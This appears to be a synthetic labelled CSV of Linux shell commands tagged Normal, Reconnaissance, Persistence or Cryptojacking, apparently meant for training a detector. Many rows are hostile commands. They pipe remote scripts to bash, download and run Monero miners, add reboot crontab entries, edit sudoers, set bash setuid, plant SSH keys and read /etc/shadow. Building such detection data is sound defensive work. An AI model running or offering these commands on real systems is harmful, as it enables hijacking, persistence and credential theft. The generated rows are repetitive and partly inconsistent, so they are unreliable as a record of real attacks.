command,label
history,Normal
curl -s http://bitbucket.org/syslogd | bash,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://142.250.190.46/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
echo 'checking system logs',Normal
uname -a && id && w,Reconnaissance
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
ls -la /var/log,Normal
chmod u+s /bin/bash,Persistence
uname -a && id && w,Reconnaissance
chmod u+s /bin/bash,Persistence
nohup ./xmr-stak -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
top -n 1,Normal
whoami,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://github.com/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./minerd -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
uname -a && id && w,Reconnaissance
wget http://185.12.33.1/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o nanopool.org:14433,Cryptojacking
wget http://192.168.1.50/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o nanopool.org:14433,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
uname -a && id && w,Reconnaissance
crontab -e,Persistence
nohup ./cpuminer -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
clear,Normal
cat /var/log/syslog | grep error,Normal
chmod u+s /bin/bash,Persistence
whoami,Normal
uname -a && id && w,Reconnaissance
whoami,Normal
ls -la /var/log,Normal
cat /etc/shadow,Reconnaissance
curl -s http://185.12.33.1/miner.tar.gz | bash,Cryptojacking
wget http://45.33.32.156/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o minexmr.com:443,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://45.33.32.156/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmr-stak -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
ps aux | grep root,Reconnaissance
curl -s http://142.250.190.46/update.sh | bash,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
top -n 1,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
wget http://192.168.1.50/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o minexmr.com:443,Cryptojacking
nohup ./kdevtmpfsi -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
whoami,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://192.168.1.50/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./coinminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
uname -a && id && w,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
netstat -tulpn,Reconnaissance
ls -la /var/log,Normal
curl -s http://192.168.1.50/update.sh | bash,Cryptojacking
top -n 1,Normal
wget http://192.168.1.50/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o nanopool.org:14433,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
ls -la /var/log,Normal
curl -s http://192.168.1.50/install.sh | bash,Cryptojacking
ps aux | grep root,Reconnaissance
netstat -tulpn,Reconnaissance
wget http://10.0.0.5/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o pool.supportxmr.com:3333,Cryptojacking
chmod u+s /bin/bash,Persistence
curl -s http://10.0.0.5/install.sh | bash,Cryptojacking
ps aux | grep root,Reconnaissance
uname -a && id && w,Reconnaissance
cat /etc/passwd,Reconnaissance
ping -c 4 192.168.1.50,Normal
wget http://192.168.1.50/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.supportxmr.com:3333,Cryptojacking
history,Normal
cat /etc/shadow,Reconnaissance
cat /etc/passwd,Reconnaissance
crontab -e,Persistence
echo 'checking system logs',Normal
cat /var/log/syslog | grep error,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ip a && route -n,Reconnaissance
echo 'checking system logs',Normal
nohup ./coinminer -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
htop,Normal
echo 'checking system logs',Normal
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
cd /home/user && pwd,Normal
netstat -tulpn,Reconnaissance
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
uname -a && id && w,Reconnaissance
top -n 1,Normal
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
netstat -tulpn,Reconnaissance
whoami,Normal
crontab -e,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
crontab -e,Persistence
crontab -e,Persistence
echo 'checking system logs',Normal
uname -a && id && w,Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
top -n 1,Normal
clear,Normal
cd /home/user && pwd,Normal
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
ip a && route -n,Reconnaissance
cat /etc/shadow,Reconnaissance
cat /etc/passwd,Reconnaissance
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
wget http://bitbucket.org/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o pool.supportxmr.com:3333,Cryptojacking
cat /etc/shadow,Reconnaissance
uname -a && id && w,Reconnaissance
uname -a && id && w,Reconnaissance
nohup ./kdevtmpfsi -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
clear,Normal
ps aux | grep root,Reconnaissance
crontab -e,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cat /proc/cpuinfo; pkill -f xmrig; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmrig -o minexmr.com:443' >> /etc/crontab,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
ls -la /var/log,Normal
cat /etc/shadow,Reconnaissance
cat /etc/passwd,Reconnaissance
curl -s http://45.33.32.156/syslogd | bash,Cryptojacking
whoami,Normal
curl -s http://142.250.190.46/cron.sh | bash,Cryptojacking
cat /etc/passwd,Reconnaissance
cat /etc/passwd,Reconnaissance
echo 'checking system logs',Normal
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
htop,Normal
chmod u+s /bin/bash,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
wget http://github.com/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o monerohash.com:3333,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ps aux | grep root,Reconnaissance
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
echo 'checking system logs',Normal
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
cat /var/log/syslog | grep error,Normal
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
cat /etc/passwd,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
whoami,Normal
wget http://45.33.32.156/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o monerohash.com:3333,Cryptojacking
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
history,Normal
clear,Normal
crontab -e,Persistence
ip a && route -n,Reconnaissance
ping -c 4 45.33.32.156,Normal
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
crontab -e,Persistence
cat /etc/passwd,Reconnaissance
ip a && route -n,Reconnaissance
ip a && route -n,Reconnaissance
nohup ./xmr-stak -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
curl -s http://10.0.0.5/miner.tar.gz | bash,Cryptojacking
clear,Normal
htop,Normal
chmod u+s /bin/bash,Persistence
clear,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cd /home/user && pwd,Normal
whoami,Normal
ip a && route -n,Reconnaissance
history,Normal
chmod u+s /bin/bash,Persistence
htop,Normal
crontab -e,Persistence
curl -s http://185.12.33.1/miner.tar.gz | bash,Cryptojacking
netstat -tulpn,Reconnaissance
echo 'checking system logs',Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cd /home/user && pwd,Normal
nohup ./xmrig -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
netstat -tulpn,Reconnaissance
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
uname -a && id && w,Reconnaissance
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
wget http://185.12.33.1/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o nanopool.org:14433,Cryptojacking
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
curl -s http://github.com/syslogd | bash,Cryptojacking
cat /etc/passwd,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
whoami,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
uname -a && id && w,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
netstat -tulpn,Reconnaissance
netstat -tulpn,Reconnaissance
nohup ./coinminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
crontab -e,Persistence
nohup ./minerd -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
nohup ./cpuminer -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
cat /etc/shadow,Reconnaissance
netstat -tulpn,Reconnaissance
htop,Normal
cat /var/log/syslog | grep error,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
netstat -tulpn,Reconnaissance
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://45.33.32.156/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cd /home/user && pwd,Normal
top -n 1,Normal
cd /home/user && pwd,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
wget http://10.0.0.5/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o xmrpool.eu:9000,Cryptojacking
htop,Normal
crontab -e,Persistence
top -n 1,Normal
uname -a && id && w,Reconnaissance
cat /etc/shadow,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f xmrig; wget https://185.12.33.1/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmrig -o minexmr.com:443' >> /etc/crontab,Cryptojacking
echo 'checking system logs',Normal
cat /etc/passwd,Reconnaissance
clear,Normal
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
top -n 1,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
crontab -e,Persistence
echo 'checking system logs',Normal
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
netstat -tulpn,Reconnaissance
cat /etc/shadow,Reconnaissance
wget http://192.168.1.50/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o pool.supportxmr.com:3333,Cryptojacking
nohup ./xmr-stak -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
curl -s http://185.12.33.1/install.sh | bash,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
crontab -e,Persistence
crontab -e,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
wget http://142.250.190.46/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o monerohash.com:3333,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
uname -a && id && w,Reconnaissance
curl -s http://192.168.1.50/miner.tar.gz | bash,Cryptojacking
htop,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/passwd,Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./coinminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
ping -c 4 142.250.190.46,Normal
netstat -tulpn,Reconnaissance
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
wget http://github.com/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o xmrpool.eu:9000,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ps aux | grep root,Reconnaissance
chmod u+s /bin/bash,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
history,Normal
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
curl -s http://192.168.1.50/install.sh | bash,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./minerd -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
htop,Normal
ip a && route -n,Reconnaissance
curl -s http://45.33.32.156/install.sh | bash,Cryptojacking
cat /etc/shadow,Reconnaissance
cat /proc/cpuinfo; pkill -f minerd; wget https://45.33.32.156/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./minerd -o minexmr.com:443' >> /etc/crontab,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ps aux | grep root,Reconnaissance
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://192.168.1.50/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./xmr-stak -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
ping -c 4 github.com,Normal
whoami,Normal
wget http://45.33.32.156/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o minexmr.com:443,Cryptojacking
ping -c 4 bitbucket.org,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
history,Normal
history,Normal
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
wget http://github.com/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o minexmr.com:443,Cryptojacking
clear,Normal
wget http://142.250.190.46/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o xmrpool.eu:9000,Cryptojacking
crontab -e,Persistence
history,Normal
history,Normal
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://45.33.32.156/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cd /home/user && pwd,Normal
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
nohup ./coinminer -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
htop,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ps aux | grep root,Reconnaissance
curl -s http://github.com/update.sh | bash,Cryptojacking
history,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
curl -s http://github.com/update.sh | bash,Cryptojacking
netstat -tulpn,Reconnaissance
wget http://185.12.33.1/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o minexmr.com:443,Cryptojacking
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://192.168.1.50/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
htop,Normal
cat /etc/shadow,Reconnaissance
history,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
wget http://10.0.0.5/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o xmrpool.eu:9000,Cryptojacking
whoami,Normal
uname -a && id && w,Reconnaissance
ls -la /var/log,Normal
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
curl -s http://10.0.0.5/install.sh | bash,Cryptojacking
clear,Normal
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
ps aux | grep root,Reconnaissance
cat /etc/shadow,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
netstat -tulpn,Reconnaissance
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
curl -s http://45.33.32.156/update.sh | bash,Cryptojacking
history,Normal
wget http://bitbucket.org/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o nanopool.org:14433,Cryptojacking
netstat -tulpn,Reconnaissance
wget http://142.250.190.46/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o xmrpool.eu:9000,Cryptojacking
cat /etc/passwd,Reconnaissance
nohup ./xmrig -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
crontab -e,Persistence
cat /etc/shadow,Reconnaissance
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
top -n 1,Normal
cat /etc/passwd,Reconnaissance
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
history,Normal
ps aux | grep root,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
uname -a && id && w,Reconnaissance
wget http://10.0.0.5/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o nanopool.org:14433,Cryptojacking
cd /home/user && pwd,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
htop,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
history,Normal
netstat -tulpn,Reconnaissance
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
cat /etc/passwd,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
uname -a && id && w,Reconnaissance
cat /proc/cpuinfo; pkill -f xmrig; wget https://45.33.32.156/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmrig -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
cat /etc/shadow,Reconnaissance
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
chmod u+s /bin/bash,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
curl -s http://45.33.32.156/syslogd | bash,Cryptojacking
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
curl -s http://185.12.33.1/install.sh | bash,Cryptojacking
curl -s http://142.250.190.46/update.sh | bash,Cryptojacking
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
uname -a && id && w,Reconnaissance
cat /proc/cpuinfo; pkill -f cpuminer; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
htop,Normal
echo 'checking system logs',Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f xmrig; wget https://10.0.0.5/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmrig -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cd /home/user && pwd,Normal
cat /etc/shadow,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./coinminer -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
chmod u+s /bin/bash,Persistence
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
cat /proc/cpuinfo; pkill -f xmrig; wget https://185.12.33.1/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmrig -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
top -n 1,Normal
crontab -e,Persistence
top -n 1,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
curl -s http://185.12.33.1/install.sh | bash,Cryptojacking
clear,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
curl -s http://10.0.0.5/miner.tar.gz | bash,Cryptojacking
netstat -tulpn,Reconnaissance
ip a && route -n,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
htop,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
wget http://192.168.1.50/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o pool.supportxmr.com:3333,Cryptojacking
uname -a && id && w,Reconnaissance
wget http://142.250.190.46/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o xmrpool.eu:9000,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
htop,Normal
